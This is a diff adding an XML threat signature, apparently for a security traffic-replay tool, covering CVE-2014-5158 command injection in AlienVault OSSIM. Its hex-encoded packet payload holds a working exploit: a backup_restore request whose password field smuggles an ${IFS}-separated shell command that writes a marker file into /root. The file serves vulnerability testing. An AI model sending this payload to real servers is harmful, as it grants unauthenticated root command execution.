@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="AlienVault OSSIM Framework Backup Command Execution"/>
+    <EngDesc display="true" value="A command execution vulnerability exists in AlienVault OSSIM Framework. The vulnerability is due to insufficient sanitization of user supplied data that is used to execute backup commands. A remote unauthenticated attacker could exploit this vulnerability by sending a crafted request to the vulnerable server. Successful exploitation could result in command execution with root privileges. Tester should set variable $destPort 40003 before test."/>
+    <Intent display="true">
+      <item value="INPUT_VALIDATION_ERROR"/>
+    </Intent>
+    <Protocol display="true" value="AlienVault OSSIM Framework Protocol"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="AlienVault"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="AlienVault"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="4.5_and_prior"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20140811-05"/>
+    <CVEID display="true" value="CVE-2014-5158"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="109579"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="3215fb817dec1b5aee9d891464ac6ab4"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="LOW"/>
+    <Authentication display="false" value="NONE"/>
+    <ConfImpact display="false" value="COMPLETE"/>
+    <IntegImpact display="false" value="COMPLETE"/>
+    <AvailImpact display="false" value="COMPLETE"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635496706949679375"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1415961043" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:50:56:B4:62:0E" destMac="00:50:56:B4:76:A1" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="00FA" Identification="CDA1" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="034B" srcIP="172.16.8.152" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="41271" destPort="$destPort" SeqNumber="EC2C1884" AckNumber="04647D93" HeaderLength="05" WindowSize="00E5" Checksum="4C52" UrgentPointer="0000" Options="" Payload="6261636B757020616374696F6E3D226261636B75705F726573746F72652220626567696E3D22323031302D30312D30312220656E643D22323031342D31302D3038222062626464686F73743D22686F7374222062626464757365723D22757365722220626264647061737377643D22247B4946537D3E247B4946537D2F6465762F6E756C6C247B4946537D323E26313B6563686F247B4946537D54454C5553247B4946537D5365637572697479247B4946537D4C6162733E2F726F6F742F74736C2E7478743B6563686F247B4946537D220A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:76:A1" destMac="00:50:56:B4:62:0E" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="010C" Identification="826E" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="4E6C" srcIP="$destIP" destIP="172.16.8.152" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="41271" SeqNumber="04647D93" AckNumber="EC2C1956" HeaderLength="05" WindowSize="0007" Checksum="4550" UrgentPointer="0000" Options="" Payload="6261636B757020616374696F6E3D226261636B75705F726573746F72652220626567696E3D22323031302D30312D30312220656E643D22323031342D31302D3038222062626464686F73743D22686F7374222062626464757365723D22757365722220626264647061737377643D22247B4946537D3E247B4946537D2F6465762F6E756C6C247B4946537D323E26313B6563686F247B4946537D54454C5553247B4946537D5365637572697479247B4946537D4C6162733E2F726F6F742F74736C2E7478743B6563686F247B4946537D22207374617475733D2232222061636B656E640A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
